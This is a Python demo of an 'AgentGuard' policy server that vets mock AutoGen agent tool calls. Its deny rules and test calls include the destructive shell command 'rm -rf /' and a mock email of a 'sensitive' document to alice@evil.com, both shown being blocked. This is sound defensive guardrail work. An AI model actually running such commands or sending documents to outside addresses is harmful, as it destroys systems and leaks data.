#!/usr/bin/env python3
"""AutoGen × AgentGuard — remote-server mode (sync & async best practice).

This demo shows **two** usage patterns side-by-side:

1. **Sync** — a MockAutoGenAgent whose tools are plain ``def`` functions,
   called synchronously.  This mirrors AutoGen ≤ 0.2 / ConversableAgent.

2. **Async** — mock tools defined as ``async def``, called inside an
   ``asyncio`` event loop.  This mirrors AutoGen ≥ 0.4 / AssistantAgent
   where the agent framework ``await``s every tool.

The guard runs in *remote* mode: a lightweight AgentGuardServer is spun up
in a background thread, and the client-side ``Guard`` object sends every
tool-call attempt to it via ``POST /v1/evaluate``.

Key API pattern
---------------
* ``guard.start(principal=..., goal=...)``  — begin a session imperatively
* ``guard.close()``                         — end the session
* No ``with guard.session(...)`` block needed; use ``try/finally`` instead.

Run (no real AutoGen dependency needed):
    PYTHONPATH=. python agentguard/examples/autogen_demo/demo_remote.py
"""

from __future__ import annotations

import asyncio

from agentguard import DecisionDenied, Guard, Principal
from agentguard.models.errors import HumanApprovalPending
from agentguard.runtime.server import AgentGuardServer
from agentguard.sdk.client import RemoteGuardClient


# ── Policy (lives on the server) ─────────────────────────────────────────────

SERVER_POLICY = """
RULE deny_destructive_shell
ON tool_call(shell.exec)
IF args.cmd == "rm -rf /"
THEN DENY

RULE allow_readonly_shell
ON tool_call(shell.exec)
IF args.cmd == "ls"
THEN ALLOW

RULE degrade_email_low_trust
ON tool_call(email.send)
IF principal.trust_level < 3
THEN DEGRADE(email.send_to_draft)

RULE: block_untrusted_email_send
TRACE: Retriever ->...?-> Mailer
CONDITION: Retriever.name == "retrieve_doc"
    AND Mailer.name == "send_email"
    AND Mailer.addr != "admin@example.com"
    AND principal.trust_level < 2
POLICY: DENY
Severity: high
Category: data_exfiltration
Reason: "Low-trust principal cannot send documents to non-admin recipients"
"""

_HOST = "127.0.0.1"
_PORT = 18082
_KEY  = "demo-secret"


# ── Mock tool implementations (sync) ─────────────────────────────────────────

def shell_exec(cmd: str) -> str:
    return f"[sync-mock] executed: {cmd}"

def email_send(to: str, body: str) -> str:
    return f"[sync-mock] sent to {to}"

def email_draft(to: str, body: str) -> str:
    return f"[sync-mock] draft saved for {to}"

def retrieve_doc(id: int) -> str:
    return f"[sync-mock] doc #{id} content"

def send_email(doc: str, addr: str) -> str:
    return f"[sync-mock] emailed '{doc}' to {addr}"


# ── Mock tool implementations (async) ────────────────────────────────────────

async def async_shell_exec(cmd: str) -> str:
    await asyncio.sleep(0)  # simulate async I/O
    return f"[async-mock] executed: {cmd}"

async def async_retrieve_doc(id: int) -> str:
    await asyncio.sleep(0)
    return f"[async-mock] doc #{id} content"

async def async_send_email(doc: str, addr: str) -> str:
    await asyncio.sleep(0)
    return f"[async-mock] emailed '{doc}' to {addr}"


# ── Mock AutoGen-style agent (function_map) ───────────────────────────────────

class MockAutoGenAgent:
    def __init__(self) -> None:
        self.function_map: dict[str, object] = {}

    def register_function(self, fn, /, **kwargs):
        name = kwargs.get("name") or fn.__name__
        self.function_map[name] = fn

    def call_function(self, name: str, **kwargs):
        fn = self.function_map[name]
        return fn(**kwargs)


# ── Mock AutoGen 0.4–style agent (_tools list) ───────────────────────────────

class MockFunctionTool:
    """Minimal stub that replicates AutoGen 0.4 FunctionTool structure.

    The key detail: the underlying callable is stored in ``_func`` (private),
    *not* the public ``func`` name used by older versions.
    """
    def __init__(self, fn, *, name: str | None = None) -> None:
        self._func = fn
        self.name: str = name or fn.__name__

    async def run_json(self, args: dict, cancellation_token=None) -> str:
        if asyncio.iscoroutinefunction(self._func):
            return await self._func(**args)
        loop = asyncio.get_running_loop()
        import functools
        return await loop.run_in_executor(None, functools.partial(self._func, **args))


class MockAutoGen04Agent:
    """Simulates AutoGen ≥ 0.4 AssistantAgent._tools pattern."""

    def __init__(self) -> None:
        self._tools: list[MockFunctionTool] = []

    def register_tool(self, fn, *, name: str | None = None) -> None:
        self._tools.append(MockFunctionTool(fn, name=name or fn.__name__))

    async def call_tool(self, name: str, **kwargs) -> str:
        for tool in self._tools:
            if tool.name == name:
                return await tool.run_json(kwargs)
        raise KeyError(name)


# ── Helpers ───────────────────────────────────────────────────────────────────

def _sync_run(agent: MockAutoGenAgent, name: str, /, **kwargs) -> None:
    label = f"{name}({kwargs})"
    try:
        result = agent.call_function(name, **kwargs)
        print(f"  ALLOW  {label} => {result}")
    except DecisionDenied as e:
        print(f"  DENY   {label} => {e.reason}")
        if e.matched_rules:
            print(f"         rules: {', '.join(e.matched_rules)}")
    except HumanApprovalPending as e:
        print(f"  REVIEW {label} => ticket={e.ticket_id}")


async def _async_run(agent: MockAutoGen04Agent, name: str, /, **kwargs) -> None:
    label = f"{name}({kwargs})"
    try:
        result = await agent.call_tool(name, **kwargs)
        print(f"  ALLOW  {label} => {result}")
    except DecisionDenied as e:
        print(f"  DENY   {label} => {e.reason}")
        if e.matched_rules:
            print(f"         rules: {', '.join(e.matched_rules)}")
    except HumanApprovalPending as e:
        print(f"  REVIEW {label} => ticket={e.ticket_id}")


# ── Demo 1: sync agent ────────────────────────────────────────────────────────

def run_sync_demo(guard: Guard) -> None:
    print("\n── [1] Sync agent (AutoGen ≤ 0.2 / function_map) ───────────────────")
    agent = MockAutoGenAgent()
    agent.register_function(shell_exec,   name="shell.exec")
    agent.register_function(email_send,   name="email.send")
    agent.register_function(email_draft,  name="email.draft")
    guard.attach_autogen(agent)

    principal = Principal(
        agent_id="autogen-sync-agent",
        session_id="sync-remote-demo",
        role="default",
        trust_level=2,
    )

    # Imperative session API — ideal for outer agent loops
    guard.start(principal=principal, goal="sync remote demo")
    try:
        _sync_run(agent, "shell.exec", cmd="ls")            # ALLOW
        _sync_run(agent, "shell.exec", cmd="rm -rf /")      # DENY
        _sync_run(agent, "email.send",
                  to="cto@corp.com", body="Q1 report")      # DEGRADE → draft
    finally:
        guard.close()


# ── Demo 2: async agent ───────────────────────────────────────────────────────

async def run_async_demo(guard: Guard) -> None:
    """Async demo mimicking AutoGen ≥ 0.4 AssistantAgent tool execution.

    ``guard.start()`` sets a ``contextvars.ContextVar`` in the current async
    task.  Any ``asyncio.Task`` or ``run_in_executor`` call that AutoGen
    spawns *after* this point will inherit a copy of the context, so the
    session principal is correctly resolved inside every tool wrapper.
    """
    print("\n── [2] Async agent (AutoGen ≥ 0.4 / _tools + _func) ───────────────")

    agent = MockAutoGen04Agent()
    agent.register_tool(async_shell_exec,   name="shell.exec")
    agent.register_tool(async_retrieve_doc, name="retrieve_doc")
    agent.register_tool(async_send_email,   name="send_email")

    # attach_autogen detects _tools with _func attribute (AutoGen 0.4 path)
    guard.attach_autogen(agent)

    principal = Principal(
        agent_id="autogen-async-agent",
        session_id="async-remote-demo",
        role="default",
        trust_level=1,   # < 2  → TRACE rule will fire for non-admin emails
    )

    # Same imperative API works in async context
    guard.start(principal=principal, goal="async remote demo")
    try:
        # Simple shell calls
        await _async_run(agent, "shell.exec", cmd="ls")          # ALLOW
        await _async_run(agent, "shell.exec", cmd="rm -rf /")    # DENY

        # TRACE rule: retrieve_doc →...?→ send_email (non-admin addr + low trust)
        await _async_run(agent, "retrieve_doc", id=0)            # ALLOW (source)
        await _async_run(agent, "send_email",
                         doc="sensitive", addr="alice@evil.com") # DENY (trace match)
        await _async_run(agent, "send_email",
                         doc="sensitive", addr="admin@example.com")  # ALLOW
    finally:
        guard.close()


# ── Entry point ───────────────────────────────────────────────────────────────

def main() -> None:
    # Start a remote AgentGuardServer in a background thread
    server = AgentGuardServer.from_policy(
        policy_source=SERVER_POLICY,
        builtin_rules=False,
        mode="enforce",
        api_key=_KEY,
    )
    try:
        handle = server.serve_in_thread(host=_HOST, port=_PORT)
    except ImportError as e:
        raise SystemExit(
            "Remote demo requires server extras.  "
            "Install with: pip install -e \".[server]\""
        ) from e

    try:
        # Verify server is up
        client = RemoteGuardClient(f"http://{_HOST}:{_PORT}", api_key=_KEY)
        health = client.health()
        print(
            f"Remote runtime ready  url=http://{_HOST}:{_PORT}",
            f"rules={health.get('rules', '?')}",
            f"mode={health.get('mode', 'enforce')}",
        )

        # Build the client-side Guard (remote mode — no policy needed here)
        guard = Guard(
            remote_url=f"http://{_HOST}:{_PORT}",
            api_key=_KEY,
            mode="enforce",
            fail_open=False,
        )

        # ── Demo 1: sync ────────────────────────────────────────────────
        run_sync_demo(guard)

        # ── Demo 2: async ───────────────────────────────────────────────
        asyncio.run(run_async_demo(guard))

        print("\n✓  All demos completed.")
    finally:
        handle.stop()


if __name__ == "__main__":
    main()
